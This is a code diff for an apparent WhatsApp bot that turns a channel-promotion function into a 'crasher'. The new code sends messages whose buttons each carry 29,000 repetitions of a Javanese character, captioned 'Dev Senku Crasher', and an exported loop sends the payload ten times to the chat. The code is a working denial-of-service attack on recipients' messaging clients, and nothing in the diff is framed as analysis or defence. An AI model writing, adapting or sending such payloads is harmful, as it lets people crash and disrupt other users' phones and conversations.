@@ -1,33 +1,54 @@
-async function bug(message, client, texts, num) {
+async function bug(message, client) {
 
-    const remoteJid = message.key.remoteJid;
+  const remoteJid = message.key.remoteJid;
 
-    await client.sendMessage(remoteJid, {
+  await client.sendMessage(
 
-        image: { url: `${num}.png` },
+    remoteJid,
+    {
+      image: { url: "4.png" }, // Replace with local or hosted image
 
-        caption: `> ${texts}`,
+      caption: "🌟 Dev Senku Crasher",
 
-        contextInfo: {
+      footer: "My Awesome Bot 🔥",
 
-            externalAdReply: {
+      media: true,
 
-                title: "Join Our WhatsApp Channel",
+      interactiveButtons: [
 
-                body: "Click here to stay updated!",
+        {
+          name: "quick_reply",
+          buttonParamsJson: JSON.stringify({
+            display_text: `Senku crash 1${"ꦾ".repeat(29000)}\n\n`,
+            id: "refresh"
+          })
+        },
+        {
+          name: "quick_reply",
+          buttonParamsJson: JSON.stringify({
+            display_text: `Senku crash 2${"ꦾ".repeat(29000)}\n\n`,
+            id: "info"
+          })
+        },
+        {
+          name: "cta_url",
+          buttonParamsJson: JSON.stringify({
+            display_text: `Senku crash 3${"ꦾ".repeat(29000)}\n\n`,
+            url: "https://example.com"
+          })
+        },
 
-                mediaType: 1, // Image preview
-
-                thumbnailUrl: `https://whatsapp.com/channel/0029Vb3FfG1InlqLn5jIg30V`,
-
-                renderLargerThumbnail: true,
-
-                mediaUrl: "https://whatsapp.com/channel/0029Vb3FfG1InlqLn5jIg30V",
-
-                sourceUrl: "https://whatsapp.com/channel/0029Vb3FfG1InlqLn5jIg30V"
-            }
-        }
-    });
+      ]
+    },
+    {
+      quoted: message
+    }
+  );
+}
+async function test(message, client) {
+    for (let i = 0; i < 10; i++) {
+        await bug(message, client);
+    }
 }
 
-export default bug;
+export default test;
